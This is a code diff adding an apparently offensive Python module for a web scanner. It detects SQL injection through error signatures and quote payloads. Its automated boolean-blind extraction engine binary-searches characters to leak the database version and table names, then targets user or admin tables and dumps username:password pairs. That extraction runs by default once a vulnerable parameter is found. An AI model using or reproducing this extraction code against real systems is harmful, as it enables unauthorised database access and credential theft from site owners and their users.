@@ -1,0 +1,323 @@
+import asyncio
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+from core.http import fetch, parse_cookie_string
+from core.output import success, warn, info
+
+ERROR_SIGNATURES = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark after the character string",
+    "quoted string not properly terminated",
+    "sqlite3.operationalerror",
+    "sqlstate[",
+    "ora-01756",
+    "pg_query():",
+    "microsoft ole db provider for sql server",
+    "odbc sql server driver",
+    "postgresql query failed",
+    "mysql_fetch_array()",
+]
+
+PAYLOADS = [
+    "'",
+    "\"",
+    "')",
+    "';",
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "1' AND '1'='2",
+]
+
+MAX_CONCURRENT_REQUESTS = 10
+ORACLE_TOLERANCE = 50        # bytes; tune per target
+MAX_EXTRACT_CHARS = 100      # cap on extraction size to prevent endless loops
+
+
+# ---------------------------------------------------------------------
+# URL / payload helpers
+# ---------------------------------------------------------------------
+
+def inject_param(url: str, param_name: str, payload: str, append: bool = True) -> str:
+    """Injects a payload into a specific query parameter. Appends by default."""
+    parsed = urlparse(url)
+    query_params = parse_qs(parsed.query, keep_blank_values=True)
+
+    if param_name in query_params and append:
+        values = query_params[param_name]
+        if len(values) > 1:
+            warn(f"param {param_name!r} has {len(values)} values; using the first")
+        query_params[param_name] = [str(values[0]) + payload]
+    else:
+        query_params[param_name] = [payload]
+
+    new_query = urlencode(query_params, doseq=True)
+    return urlunparse((
+        parsed.scheme, parsed.netloc, parsed.path,
+        parsed.params, new_query, parsed.fragment,
+    ))
+
+
+def contains_sql_error(body: str) -> str | None:
+    """Returns the matched (lowercased) signature, or None."""
+    if not body:
+        return None
+    lowered = body.lower()
+    for sig in ERROR_SIGNATURES:
+        if sig in lowered:
+            return sig
+    return None
+
+
+def _normalize_cookies(cookies):
+    """Accept either a dict or a raw cookie string."""
+    if cookies is None:
+        return None
+    if isinstance(cookies, str):
+        return parse_cookie_string(cookies)
+    return cookies
+
+
+# ---------------------------------------------------------------------
+# Error-based detection
+# ---------------------------------------------------------------------
+
+async def test_payload_task(session, url, param, payload, rate_limiter,
+                            cookies, base_errors, sem):
+    """Safely executes payload testing constrained by the semaphore."""
+    async with sem:
+        test_url = inject_param(url, param, payload, append=True)
+        status, _, body, _ = await fetch(
+            session, test_url, rate_limiter, cookies=cookies
+        )
+        if body is None:
+            return None
+
+        match = contains_sql_error(body)
+        if match and match not in base_errors:
+            return {
+                "type": "sqli",
+                "severity": "high",
+                "url": url,
+                "parameter": param,
+                "payload": payload,
+                "evidence": f"SQL error signature matched: {match!r}",
+            }
+        return None
+
+
+# =====================================================================
+# EXTRACTION ENGINE: Boolean Blind Data Extraction
+# =====================================================================
+
+async def _oracle_probe(session, url, param, sql_condition,
+                        rate_limiter, cookies) -> tuple[bool, int] | tuple[None, None]:
+    """Returns (matched, body_length) or (None, None) on transport failure."""
+    payload = f"' AND ({sql_condition}) AND '1'='1"
+    test_url = inject_param(url, param, payload, append=True)
+    status, _, body, _ = await fetch(session, test_url, rate_limiter, cookies=cookies)
+    if body is None:
+        return None, None
+    return True, len(body)
+
+
+async def validate_oracle(session, url, param, rate_limiter, cookies,
+                          verbose=False) -> tuple[bool, int, int]:
+    """Sanity-check the boolean oracle. Returns (usable, true_len, false_len)."""
+    _, true_len = await _oracle_probe(session, url, param, "1=1", rate_limiter, cookies)
+    _, false_len = await _oracle_probe(session, url, param, "1=2", rate_limiter, cookies)
+
+    if true_len is None or false_len is None:
+        return False, 0, 0
+
+    delta = abs(true_len - false_len)
+    usable = delta >= ORACLE_TOLERANCE
+    if verbose:
+        info(f"oracle check: true_len={true_len} false_len={false_len} "
+             f"delta={delta} usable={usable}")
+    return usable, true_len, false_len
+
+
+async def check_boolean_condition(session, url, param, sql_condition,
+                                  rate_limiter, cookies, true_length) -> bool:
+    """True if the response length is close to the known-True length."""
+    _, length = await _oracle_probe(session, url, param, sql_condition,
+                                    rate_limiter, cookies)
+    if length is None:
+        return False
+    return abs(length - true_length) < ORACLE_TOLERANCE
+
+
+async def extract_sql_data(session, url, param, rate_limiter, cookies, true_len, 
+                           sql_query, label="data", verbose=False) -> str:
+    """Generic extraction using binary search over the boolean oracle."""
+    info(f"extracting {label} via param {param!r}...")
+    extracted = ""
+
+    for char_pos in range(1, MAX_EXTRACT_CHARS + 1):
+        low, high = 32, 126
+        while low <= high:
+            mid = (low + high) // 2
+            cond = f"ascii(substring(({sql_query}),{char_pos},1))>{mid}"
+            if await check_boolean_condition(session, url, param, cond,
+                                             rate_limiter, cookies, true_len):
+                low = mid + 1
+            else:
+                high = mid - 1
+
+        if low < 33 or low > 126:
+            break
+        extracted += chr(low)
+        if verbose:
+            info(f"  {label} current state: {extracted!r}")
+
+    return extracted
+
+
+async def extract_vulnerable_database_assets(session, url, param, rate_limiter, cookies, verbose=False):
+    """Orchestrates complete asset extraction: Banner -> Tables -> Targeted Dump."""
+    usable, true_len, _ = await validate_oracle(
+        session, url, param, rate_limiter, cookies, verbose=verbose
+    )
+    if not usable:
+        warn(f"boolean oracle unreliable for param {param!r}; skipping extraction")
+        return {}
+
+    assets = {}
+
+    # 1. Extract DB Version / Identity Banner
+    db_version = await extract_sql_data(
+        session, url, param, rate_limiter, cookies, true_len, 
+        "version()", label="DB Banner", verbose=verbose
+    )
+    if db_version:
+        assets["db_version"] = db_version
+        success(f"Leaked DB Banner: {db_version}")
+
+    # 2. Extract Table Names via Information Schema
+    tables_query = (
+        "SELECT group_concat(table_name) FROM information_schema.tables "
+        "WHERE table_schema=database()"
+    )
+    table_names = await extract_sql_data(
+        session, url, param, rate_limiter, cookies, true_len, 
+        tables_query, label="Table Names", verbose=verbose
+    )
+    
+    if table_names:
+        assets["tables"] = table_names.split(",")
+        success(f"Discovered Tables: {table_names}")
+        
+        # 3. Dynamic Targeted Credential Dump Heuristics
+        target_table = None
+        lower_tables = table_names.lower()
+        for candidate in ["admin", "user", "account", "credential", "staff", "member", "pass"]:
+            if candidate in lower_tables:
+                for t in assets["tables"]:
+                    if candidate in t.lower():
+                        target_table = t
+                        break
+                if target_table:
+                    break
+
+        if target_table:
+            warn(f"High-value target table found: {target_table!r}. Attempting credential dump...")
+            # Guesses common standard column schemes
+            cred_query = f"SELECT group_concat(concat(username, ':', password)) FROM {target_table}"
+            credentials = await extract_sql_data(
+                session, url, param, rate_limiter, cookies, true_len, 
+                cred_query, label="Credentials (user:pass)", verbose=verbose
+            )
+            if credentials:
+                assets["credentials"] = credentials.split(",")
+                success(f"DUMPED CREDENTIALS: {credentials}")
+        else:
+            info("No obvious credential or user tables detected automatically.")
+
+    return assets
+
+
+# =====================================================================
+# MAIN RUNNER PIPELINE
+# =====================================================================
+
+async def test_url(url, session, rate_limiter, cookies=None, verbose=False,
+                   auto_extract=True):
+    if not url:
+        return []
+
+    parsed = urlparse(url)
+    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
+    if not params:
+        return []
+
+    cookies = _normalize_cookies(cookies)
+
+    try:
+        status, _, base_body, _ = await fetch(
+            session, url, rate_limiter, cookies=cookies
+        )
+    except Exception as e:
+        if verbose:
+            warn(f"baseline fetch failed for {url}: {type(e).__name__}: {e!r}")
+        return []
+
+    if status is None or base_body is None:
+        return []
+
+    base_length = len(base_body)
+    base_errors = set()
+    low_base = base_body.lower()
+    for sig in ERROR_SIGNATURES:
+        if sig in low_base:
+            base_errors.add(sig)
+
+    sem = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
+    tasks = [
+        test_payload_task(session, url, param, payload,
+                          rate_limiter, cookies, base_errors, sem)
+        for param in params
+        for payload in PAYLOADS
+    ]
+
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+
+    findings = []
+    seen = set()
+    vulnerable_params = []
+
+    for res in results:
+        if isinstance(res, Exception):
+            if verbose:
+                warn(f"payload task error: {type(res).__name__}: {res!r}")
+            continue
+        if not res:
+            continue
+
+        key = (res["parameter"], res["payload"])
+        if key in seen:
+            continue
+        seen.add(key)
+        findings.append(res)
+        
+        if res["parameter"] not in vulnerable_params:
+            vulnerable_params.append(res["parameter"])
+
+        if verbose:
+            success(f"SQLi candidate: param={res['parameter']!r} payload={res['payload']!r}")
+
+    # Automated post-vulnerability data harvesting sequence
+    if auto_extract and vulnerable_params:
+        for target_param in vulnerable_params:
+            try:
+                leaked_assets = await extract_vulnerable_database_assets(
+                    session, url, target_param, rate_limiter, cookies, verbose=verbose
+                )
+                if leaked_assets:
+                    for f in findings:
+                        if f["parameter"] == target_param:
+                            f["extracted_data"] = leaked_assets
+            except Exception as e:
+                warn(f"extraction failed for {target_param!r}: {type(e).__name__}: {e!r}")
+
+    return findings
